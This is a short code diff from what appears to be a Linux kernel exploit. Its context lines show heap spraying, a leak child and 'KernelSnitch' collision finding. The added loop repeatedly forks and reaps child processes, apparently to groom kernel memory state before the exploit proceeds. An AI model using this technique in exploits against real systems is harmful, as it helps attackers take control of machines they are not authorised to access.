@@ -186,6 +186,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
  kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));
+ for (int drain = 0; drain < 4; drain++) {
+    pid_t drain_pids[32];
+    for (int i = 0; i < 32; i++) {
+        drain_pids[i] = fork();
+        if (drain_pids[i] == 0) {
+            _exit(0);
+        }
+    }
+    for (int i = 0; i < 32; i++) {
+        if (drain_pids[i] > 0) {
+            waitpid(drain_pids[i], NULL, 0);
+        }
+    }
+    sched_yield();
+}
 
  if (!kernelsnitch_collisions_ready()) {
  pr_error("pipe KernelSnitch collision finding failed\n");
